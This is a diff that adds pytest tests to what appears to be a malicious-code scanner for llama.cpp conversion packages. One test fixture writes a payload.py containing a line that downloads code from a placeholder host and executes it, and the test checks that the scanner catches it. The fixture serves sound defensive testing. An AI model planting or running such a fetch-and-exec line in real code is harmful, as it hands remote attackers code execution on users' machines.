@@ -1944,6 +1944,55 @@ def test_truncation_is_declared_only_when_something_was_dropped(
         llama_cpp._scan_conversion_package(str(root))      # must not raise
 
 
+def test_a_payload_directly_under_gguf_py_is_scanned(tmp_path, monkeypatch):
+    """The entrypoint inserts gguf-py into sys.path, not gguf-py/gguf.
+
+    So anything directly under gguf-py is importable by its own name. Scanning
+    only the gguf subpackage left gguf-py/payload.py importable as `payload` from
+    a clean-looking gguf/__init__.py, with nothing reading it.
+    """
+    llama_cpp = _load("llama_cpp_gguf_root_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    gguf_py = root / "gguf-py"
+    (gguf_py / "gguf").mkdir(parents = True)
+    (gguf_py / "gguf" / "__init__.py").write_text("import payload\n", encoding = "utf-8")
+    (gguf_py / "payload.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_gguf_py_is_planned_as_an_import_root_and_walked_once(tmp_path):
+    """It is an import root, so it contributes its own modules and each directory
+    under it, and it is not also swept up as a child of the llama.cpp root."""
+    llama_cpp = _load("llama_cpp_gguf_plan_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    gguf_py = root / "gguf-py"
+    for child in ("gguf", "tests", "examples"):
+        (gguf_py / child).mkdir(parents = True)
+    (gguf_py / "util.py").write_text("X = 1\n", encoding = "utf-8")
+
+    plan = llama_cpp._scanned_locations(str(root))
+    by_label = {location.label: location for location in plan.locations}
+    assert "gguf-py" in by_label and by_label["gguf-py"].recursive is False
+    assert {"gguf-py/gguf", "gguf-py/tests", "gguf-py/examples"} <= set(by_label)
+    # Walked once: not also a recursive child of the llama.cpp root.
+    assert [label for label in by_label if label == "gguf-py"] == ["gguf-py"]
+    assert by_label["gguf-py"].natives is False
+    assert by_label["gguf-py/gguf"].natives is True
+
+    # Its own top-level modules are read, without recursing into its children.
+    walk = llama_cpp._conversion_package_modules(str(gguf_py), recursive = False)
+    assert "util.py" in walk.names
+
+
 def _package_root(tmp_path):
     root = tmp_path / "llama.cpp"
     conversion = root / "conversion"
